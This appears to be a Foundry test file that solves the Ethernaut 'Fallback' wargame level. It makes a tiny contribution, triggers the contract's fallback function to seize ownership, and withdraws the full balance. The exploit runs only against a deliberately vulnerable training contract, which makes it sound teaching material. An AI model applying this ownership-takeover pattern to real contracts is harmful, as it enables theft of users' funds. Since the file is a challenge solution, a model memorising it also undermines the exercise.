// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_1/Fallback.sol";

contract FallbackTest is Test {
    Fallback public fb;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
        vm.prank(alice);
        fb = new Fallback();
    }

    function testAttack() public {
        // sadding ether to this address
        vm.deal(address(this), 1 ether);
        // adding eth to the fallback address
        vm.deal(address(fb), 1 ether);

        fb.contribute{value: 0.0001 ether}();
        address(fb).call{value: 0.001 ether}("");

        assertEq(fb.owner(), address(this));

        fb.withdraw();
        assertEq(address(fb).balance, 0);
    }

    receive() external payable {}
}
